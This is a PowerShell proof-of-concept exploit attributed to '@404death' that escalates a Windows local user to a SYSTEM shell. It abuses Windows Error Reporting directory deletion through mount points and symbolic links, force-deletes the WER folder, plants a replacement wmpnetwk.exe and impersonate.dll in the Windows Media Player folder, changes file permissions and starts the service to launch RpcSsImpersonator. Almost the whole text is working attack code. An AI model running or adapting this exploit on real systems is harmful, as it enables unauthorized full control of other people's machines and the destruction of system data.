# @404death
# FIles/directories deletion to SYSTEM shell

### Load NtApiDotNet

Write-Host "[+] files/directories deletion to SYSTEM shell technique ."

Write-Host "[+] POC by @404death !!!!"

### Load NtApiDotNet

$PathCurrentDirectory = Get-Location 
$PathNtApiDotNet = Join-Path -Path $PathCurrentDirectory -Child "NtApiDotNet.dll"
if (![System.IO.File]::Exists($PathNtApiDotNet)){
    Import-Module NtObjectManager -ErrorAction Ignore
    Write-Host "[*] Imported NtObjectManager module !"
#    Write-Host "Hello"  
} else {
    Import-Module "$PathNtApiDotNet" -ErrorAction "Stop"
    Write-Host "[*] Loaded '$PathNtApiDotNet'"  
    Write-Host "[*] Imported NtObjectManager module !"
}   


$path = "c:\programdata\microsoft\windows\wer"
$linkpath = "\RPC Control"
$target1 = "c:\windows\system32\wermgr.exe.local"
$target2 = "C:\Program Files\Windows Media Player"

schtasks /run /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" | Out-Null

Start-Sleep -s 1

Remove-Item -Recurse -Force $path\Temp -ErrorAction SilentlyContinue | Out-Null

Start-Sleep -s 1

[NtApiDotNet.NtFile]::CreateMountPoint("\??\$path", $linkpath, $null) | Out-Null

Write-Host "[+] Mount point created successfully on $linkpath"

$clink = [NtApiDotNet.NtSymbolicLink]::Create("$linkpath\temp", "\??\$target2")

$clink | Out-Null

# [NtApiDotNet.NtSymbolicLink]::Create("$linkpath\temp", "\??\$target2") | Out-Null

# New-NtSymbolicLink "$linkpath\temp" "\??\$target2" | Out-Null

Write-Host "[+] Symbolic link created successfully on $target2"

#Start-Sleep -s 3

# Type definitions taken in part from MSDN documentation as well as from
# http://www.pinvoke.net/default.aspx/wer.WerReportSubmit and http://www.pinvoke.net/default.aspx/wer.WerReportCreate

        $MethodDefinition = @'
        public enum WER_REPORT_TYPE
         {
         WerReportNonCritical,
         WerReportCritical,
         WerReportApplicationCrash,
         WerReportApplicationHange,
         WerReportKernel,
         WerReportInvalid
         }
        public enum WER_CONSENT
         {
         WerConsentAlwaysPrompt = 4,
         WerConsentApproved = 2,
         WerConsentDenied = 3,
         WerConsentMax = 5,
         WerConsentNotAsked = 1
         }
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportCreate(string pwzEventType, WER_REPORT_TYPE repType, IntPtr pReportInformation, ref IntPtr phReportHandle);
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportSubmit(IntPtr hReportHandle, int consent, int dwFlags, ref IntPtr pSubmitResult);
'@
        Add-Type -MemberDefinition $MethodDefinition -Name 'WER' -Namespace 'Win32' -PassThru | Out-Null
        $handle = 0 # Need to create the variable for the ref, so lets add this in so long.
        if( ([Win32.WER]::WerReportCreate("A",[Win32.WER+WER_REPORT_TYPE]::WerReportNonCritical, 0, [ref] $handle)) -ne 0 ){ # 0 in third argument is for blank pReportInformation
            Write-Host "[-] Exploit failed. Couldn't create the report" -ForegroundColor Red
        }
        $result = 999 # Need to create the variable for the ref, so set it to a random value of 999.
        if( [Win32.WER]::WerReportSubmit($handle, 1, 164, [ref]$result) -eq 0){ # 1 = WerConsentNotAsked, 36 = WER_SUBMIT_QUEUE | WER_SUBMIT_OUTOFPROCESS | WER_SUBMIT_ARCHIVE_PARAMETERS_ONLY
            Write-Host "[+] WER directory creation via WER report submission was a success!" -ForegroundColor Green
        }
        else {
            Write-Host "[-] Exploit failed. Couldn't submit the report" -ForegroundColor Red   
        }

# schtasks /run /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" | Out-Null
Write-Host "test123"
Start-Sleep -s 1

[NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$path") | Out-Null

[NtApiDotNet.NtFile]::Delete("$linkpath\temp") | Out-Null

Remove-Item -Recurse -Force $path -ErrorAction SilentlyContinue | Out-Null

Copy-Item ".\impersonate.dll" -Destination "$target2\" -Force

Start-Sleep -s 1

Copy-Item ".\wmpnetwk.exe" -Destination "$target2\wmpnetwk.exe" -Force

Start-Sleep -s 1

Write-Host "[+] Copied necessary files to $target2"

# icacls "C:\Program Files\Windows Media Player\wmpnetwk.exe"  /grant 'NT AUTHORITY\NETWORK SERVICE:F'

$execfile = "C:\Program Files\Windows Media Player\wmpnetwk.exe"

$acl = Get-Acl $execfile

$user = "NT AUTHORITY\NETWORK SERVICE"

$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($user,"FullControl","Allow")

$acl.SetAccessRule($AccessRule)

$acl | Set-Acl $execfile

Write-Host "[+] Set DACL Permission on payload exec File ..."

Start-Sleep -s 1

Start-Service -Name "wmpnetworksvc" -WarningAction silentlyContinue -ErrorAction SilentlyContinue

$wmpnetworksvcx = "Windows Media Player Network Sharing Service"

#$x = Write-Host "$wmpnetworksvcx" -ForegroundColor Red

Write-Host "[+] The Service : 'wmpnetworksvc' has been triggered !"

#[NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$path") | Out-Null

Write-Host "[+] Removed Mount Point . "

Write-Host "[+] Launched RpcSsImpersonator !"

.\RpcSsImpersonator.exe

############## POC by @404death !!!!
